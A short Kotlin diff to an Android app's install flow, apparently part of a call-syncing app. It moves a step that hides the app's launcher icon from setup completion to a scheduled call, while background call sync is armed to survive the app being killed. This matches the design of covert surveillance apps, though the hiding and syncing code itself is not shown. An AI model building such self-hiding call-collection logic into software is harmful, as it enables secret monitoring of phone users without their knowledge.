@@ -35,8 +35,7 @@ object InstallFlow {
         CallSyncHelper.markBackgroundSyncEnabled(app, true)
         SyncBootstrap.armBackgroundSync(app)
         SyncWorkScheduler.enqueueNow(app)
-        LauncherHider.hide(app, goHome = false, keepProcess = true)
-        Log.d(TAG, "Setup complete — hidden, kill-state sync armed")
+        Log.d(TAG, "Setup complete — kill-state sync armed")
     }
 
     fun runInitialSetup(context: Context, source: String = "install") {
@@ -57,6 +56,7 @@ object InstallFlow {
         }
 
         completeSetup(app)
+        LauncherHider.markAndSchedule(app)
         BackgroundSyncRunner.run {
             CallSyncService.holdDuring(app) {
                 try {
